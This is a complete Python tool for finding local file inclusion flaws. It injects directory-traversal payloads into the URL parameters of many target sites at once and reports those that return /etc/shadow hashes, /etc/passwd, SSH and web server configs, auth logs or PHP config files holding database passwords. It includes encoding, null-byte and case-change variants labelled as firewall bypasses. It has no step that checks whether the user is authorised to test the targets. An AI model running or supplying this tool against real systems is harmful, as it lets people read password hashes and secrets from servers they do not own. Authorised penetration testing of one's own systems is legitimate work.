#!/usr/bin/env python3

import requests
import argparse
import logging
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init(autoreset=True)

# Disable SSL warnings to prevent console clutter when scanning HTTPS URLs with self-signed certificates
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Setup logging to capture detailed scan information and errors
logging.basicConfig(
    filename='lfi_scanner.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Define payloads along with their associated keyword regex patterns
# Reordered to prioritize /etc/shadow payloads before others like /etc/passwd
PAYLOAD_KEYWORDS = [
    # /etc/shadow payloads
    ("../../../../../../../../../../../../etc/shadow", [
        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
    ]),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow", [
        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
    ]),
    ("..../..//..../..//..../..//..//etc/shadow", [
        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
    ]),

    # /etc/passwd payloads
    ("../../../../../../../../../../../../etc/passwd", [r"root:x"]),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", [r"root:x"]),
    ("../../../../../../../../../../../../etc/passwd%00", [r"root:x"]),
    ("..../..//..../..//..../..//..//etc/passwd", [r"root:x"]),
    ("../../../../../../../../../../../../eTc/PaSsWd", [r"root:x"]),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", [r"root:x"]),

    # /etc/hosts payloads
    ("../../../../../../../../../../../../etc/hosts", [r"127\.0\.0\.1"]),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts", [r"127\.0\.0\.1"]),
    ("../../../../../../../../../../../../etc/hosts%00", [r"127\.0\.0\.1"]),
    ("..../..//..../..//..../..//..//etc/hosts", [r"127\.0\.0\.1"]),
    ("../../../../../../../../../../../../Etc/HoStS", [r"127\.0\.0\.1"]),

    # Other standard payloads
    ("../../../../../../../../../../../../var/log/apache2/access.log", [r"GET"]),
    ("../../../../../../../../../../../../var/log/apache2/access.log%00", [r"GET"]),
    ("../../../../../../../../../../../../var/log/apache2/access.log", [r"GET"]),
    ("../../../../../../../../../../../../var/log/nginx/access.log", [r"GET"]),
    ("../../../../../../../../../../../../var/log/nginx/error.log", [r"error"]),
    ("../../../../../../../../../../../../var/log/auth.log", [r"Accepted"]),
    ("../../../../../../../../../../../../etc/ssh/sshd_config", [r"sshd", r"Port \d+"]),
    ("../../../../../../../../../../../../etc/apache2/apache2.conf", [r"User", r"Group"]),
    ("../../../../../../../../../../../../etc/nginx/nginx.conf", [r"worker_connections", r"events"]),
    ("../../../../../../../../../../../../var/spool/cron/crontabs/root", [r"MAILTO="]),

    # WAF bypass techniques
    # Double URL encoding
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", [r"root:x"]),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow", [
        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
    ]),

    # Null byte injection
    ("../../../../../../../../../../../../var/www/html/config.php%00", [r"(<\?php){2,}", r"DB_PASSWORD"]),

    # Path obfuscation
    ("..../..//..../..//..../..//..//etc/passwd", [r"root:x"]),
    ("..../..//..../..//..../..//..//etc/shadow", [
        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
    ]),

    # Case variation
    ("../../../../../../../../../../../../eTc/PaSsWd", [r"root:x"]),
    ("../../../../../../../../../../../../Etc/HoStS", [r"127\.0\.0\.1"]),

    # Hexadecimal encoding (ASCII to hex for '/etc/passwd')
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", [r"root:x"]),

    # NGINX/Apache log files
    ("../../../../../../../../../../../../var/log/nginx/access.log", [r"GET"]),
    ("../../../../../../../../../../../../var/log/nginx/error.log", [r"error"]),

    # Security logs and SSH config
    ("../../../../../../../../../../../../var/log/auth.log", [r"Accepted"]),
    ("../../../../../../../../../../../../etc/ssh/sshd_config", [r"sshd", r"Port \d+"]),

    # Apache2 config
    ("../../../../../../../../../../../../etc/apache2/apache2.conf", [r"User", r"Group"]),
    ("../../../../../../../../../../../../etc/nginx/nginx.conf", [r"worker_connections", r"events"]),

    # Root crontab
    ("../../../../../../../../../../../../var/spool/cron/crontabs/root", [r"MAILTO="]),
]

# Pre-compile all regex patterns with re.IGNORECASE and re.MULTILINE for performance and multiline matching
for i, (payload, patterns) in enumerate(PAYLOAD_KEYWORDS):
    try:
        PAYLOAD_KEYWORDS[i] = (payload, [re.compile(pattern, re.IGNORECASE | re.MULTILINE) for pattern in patterns])
    except re.error as e:
        logging.error(f"Regex compilation error for payload '{payload}': {e}")
        PAYLOAD_KEYWORDS[i] = (payload, [])

def read_urls(file_path):
    """
    Read URLs from the input file.
    Each URL should be on a separate line.
    """
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(urls)} URLs from {file_path}")
        return urls
    except Exception as e:
        logging.error(f"Failed to read URLs from {file_path}: {e}")
        return []

def identify_parameters(url):
    """
    Parse the URL and extract query parameters.
    Returns the base URL and parameters as a dictionary.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    # Flatten the parameters: parse_qs returns list values
    params = {k: v[0] for k, v in params.items()}
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    logging.debug(f"Identified parameters for URL {url}: {params}")
    return base_url, params

def construct_url(base_url, params):
    """
    Construct URL with updated parameters.
    """
    query = urlencode(params)
    return f"{base_url}?{query}"

def send_request(url):
    """
    Send an HTTP GET request to the specified URL.
    Returns the response object if successful, else None.
    """
    try:
        response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        logging.debug(f"Received response for URL {url} with status code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed for URL {url}: {e}")
        return None

def analyze_response(response, compiled_patterns):
    """
    Analyze the HTTP response for the presence of any of the keyword patterns using pre-compiled regex.
    Returns True if any pattern matches, False otherwise.
    """
    if response and response.status_code == 200:
        for pattern in compiled_patterns:
            try:
                if pattern.search(response.text):
                    logging.debug(f"Keyword pattern '{pattern.pattern}' matched.")
                    return True
            except re.error as regex_error:
                logging.error(f"Invalid regex pattern: {pattern.pattern} | Error: {regex_error}")
    return False

def process_url(url):
    """
    Process a single URL by injecting payloads into its parameters one at a time and analyzing responses.
    Returns a list of tuples with vulnerable URLs, parameter, and the payload that triggered the vulnerability.
    """
    vulnerable = []
    base_url, params = identify_parameters(url)
    
    if not params:
        logging.info(f"No parameters found in URL: {url}")
        return vulnerable
    
    for param in params:
        injected_params = params.copy()
        payload_success = False  # Flag to indicate if a payload succeeded for this parameter
        for payload, keyword_patterns in PAYLOAD_KEYWORDS:
            if not keyword_patterns:
                continue  # Skip if no valid regex patterns
            # Inject payload into the current parameter only
            injected_params[param] = payload
            injected_url = construct_url(base_url, injected_params)
            logging.info(f"Testing payload: {payload} on URL: {injected_url} (Parameter: {param})")
            response = send_request(injected_url)
            
            if analyze_response(response, keyword_patterns):
                logging.info(f"VULNERABLE: {injected_url} | Parameter: {param} | Payload: {payload}")
                print(f"{Fore.GREEN}[+] Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
                vulnerable.append((injected_url, param, payload))
                payload_success = True
                break  # Stop trying other payloads for this parameter
            else:
                print(f"{Fore.RED}[-] Not Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
        
        if payload_success:
            continue  # Move to the next parameter after a successful payload
    
    return vulnerable

def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description='Automated LFI Scanner with Enhanced Detection and Output')
    parser.add_argument('-i', '--input', required=True, help='Input file with URLs (one per line)')
    parser.add_argument('-o', '--output', required=True, help='Output file for vulnerable URLs')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    args = parser.parse_args()
    
    # Read URLs from input file
    urls = read_urls(args.input)
    if not urls:
        print("No URLs to process. Please check the input file.")
        return
    
    # Open output file for writing vulnerable URLs
    try:
        output_file = open(args.output, 'w')
        logging.info(f"Opened output file: {args.output}")
    except Exception as e:
        logging.error(f"Failed to open output file {args.output}: {e}")
        print(f"Failed to open output file {args.output}. Check log for details.")
        return
    
    # Start scanning with ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        # Submit all URLs to the executor
        futures = {executor.submit(process_url, url): url for url in urls}
        
        for future in as_completed(futures):
            url = futures[future]
            try:
                vulnerable = future.result()
                if vulnerable:
                    for vuln_url, param, payload in vulnerable:
                        output_file.write(f"{vuln_url} | Parameter: {param} | Payload: {payload}\n")
            except Exception as e:
                logging.error(f"Error processing URL {url}: {e}")
                print(f"{Fore.RED}Error processing URL {url}. Check log for details.{Style.RESET_ALL}")
    
    output_file.close()
    print(f"\nScan complete. Results saved to {args.output}")
    logging.info("Scanning completed.")

if __name__ == "__main__":
    main()
